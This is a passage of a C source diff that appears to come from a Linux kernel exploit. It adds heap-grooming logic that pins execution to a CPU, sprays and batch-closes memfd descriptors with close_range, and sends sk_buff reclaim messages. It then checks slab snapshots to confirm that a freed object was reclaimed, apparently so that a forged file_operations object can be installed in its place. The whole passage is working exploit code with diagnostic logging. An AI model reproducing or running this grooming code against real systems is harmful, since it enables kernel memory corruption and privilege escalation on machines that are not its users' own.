+            "[groom] partial seed CPU drift expected=%d actual=%d errno=%d\n",
+            g_groom_cpu, sched_getcpu(), errno);
+    goto cleanup;
+  }
+  int *seed_sources[OSS_CRITICAL_FD_MAX];
+  size_t seed_count = 0;
+  for (size_t i = 0; i < prepare_slab_count; i++) {
+    seed_sources[seed_count++] = &prepare_ctx.memfds[i * mm_objs_per_slab];
+  }
+  for (size_t i = 0; i < spray_seed_drains; i++) {
+    seed_sources[seed_count++] = &spray_ctx.memfds[i * mm_objs_per_slab];
+  }
+  if (seed_count > OSS_CRITICAL_FD_MAX) {
+    fprintf(stderr, "[groom] partial seed overflow count=%zu\n", seed_count);
+    goto cleanup;
+  }
+
+  int seed_first_fd = -1, seed_last_fd = -1;
+  if (!prepare_close_range_batch(seed_sources, seed_count, &seed_first_fd,
+                                 &seed_last_fd)) {
+    fprintf(stderr,
+            "[groom] partial seed close_range preparation failed count=%zu "
+            "errno=%d\n",
+            seed_count, errno);
+    goto cleanup;
+  }
+  if (!close_range_batch(seed_first_fd, seed_last_fd)) {
+    int close_error = errno;
+    for (int close_fd = seed_first_fd; close_fd <= seed_last_fd; close_fd++) {
+      close(close_fd);
+    }
+    fprintf(stderr,
+            "[groom] partial seed close_range failed first=%d last=%d "
+            "errno=%d\n",
+            seed_first_fd, seed_last_fd, close_error);
+    goto cleanup;
+  }
+  fprintf(stderr, "[groom] mm partial seed prepare=%zu spray=%zu cpu=%d\n",
+          prepare_slab_count, spray_seed_drains, sched_getcpu());
+
+  int *critical_sources[] = {&memfd_leak};
+  size_t critical_count = sizeof(critical_sources) / sizeof(critical_sources[0]);
+  int critical_first_fd = -1, critical_last_fd = -1;
+  if (!prepare_close_range_batch(critical_sources, critical_count,
+                                 &critical_first_fd, &critical_last_fd)) {
+    fprintf(stderr,
+            "[groom] final target close_range preparation failed errno=%d\n",
+            errno);
+    goto cleanup;
+  }
+
+  struct reclaim_slab_snapshot reclaim_before;
+  if (!read_reclaim_slabs(&reclaim_before)) {
+    fprintf(stderr, "[groom] pre-reclaim slab snapshot failed\n");
+    for (int close_fd = critical_first_fd; close_fd <= critical_last_fd;
+         close_fd++) {
+      close(close_fd);
+    }
+    goto cleanup;
+  }
+  if (pin_and_validate_groom_cpu() != 0 || sched_getcpu() != g_groom_cpu) {
+    fprintf(stderr,
+            "[groom] critical CPU drift expected=%d actual=%d errno=%d\n",
+            g_groom_cpu, sched_getcpu(), errno);
+    for (int close_fd = critical_first_fd; close_fd <= critical_last_fd;
+         close_fd++) {
+      close(close_fd);
+    }
+    goto cleanup;
+  }
+
+  size_t drain_triggers = seed_count;
   int reclaim_sent = 0;
   int reclaim_incomplete = 0;
+  ssize_t sent;
+  if (!close_range_batch(critical_first_fd, critical_last_fd)) {
+    int close_error = errno;
+    for (int close_fd = critical_first_fd; close_fd <= critical_last_fd;
+         close_fd++) {
+      close(close_fd);
+    }
+    fprintf(stderr,
+            "[groom] critical close_range failed first=%d last=%d errno=%d\n",
+            critical_first_fd, critical_last_fd, close_error);
+    goto cleanup;
+  }
   for (int i = 0; i < OSS_SKB_RECLAIM_SENDS; i++) {
-    ssize_t sent;
     do {
-      errno = 0;
       sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
     } while (sent < 0 && errno == EINTR);
     if (sent == (ssize_t)OSS_SKB_SEND_SIZE) {
@@ -656,6 +1154,9 @@ static uint64_t groom_and_install_fops_object_impl(
     reclaim_incomplete = 1;
     break;
   }
+  fprintf(stderr,
+          "[groom] target cage refs=%zu seed=%zu final_release=%zu cpu=%d\n",
+          cage_count, seed_count, critical_count, sched_getcpu());
   fprintf(stderr,
           "[groom] mm drain triggers=%zu sk_buff reclaim sends=%d/%d\n",
           drain_triggers, reclaim_sent, OSS_SKB_RECLAIM_SENDS);
@@ -671,8 +1172,18 @@ static uint64_t groom_and_install_fops_object_impl(
     goto cleanup;
   }
 
+  struct reclaim_slab_snapshot reclaim_after;
+  if (!read_reclaim_slabs(&reclaim_after) ||
+      !exact_mm_reclaim(&reclaim_before.mm, &reclaim_after.mm,
+                        (unsigned long)critical_count)) {
+    fprintf(stderr,
+            "[groom] exact reclaim proof rejected released_refs=%zu\n",
+            critical_count);
+    goto cleanup;
+  }
+
   int quiet_samples = 0;
-  if (!wait_for_reclaim_quiet_window(&quiet_samples)) {
+  if (!wait_for_reclaim_quiet_window(&quiet_samples, NULL)) {
     fprintf(stderr,
             "[groom] reclaim quiet window rejected samples=%d required=%d\n",
             quiet_samples, OSS_RECLAIM_QUIET_STREAK);
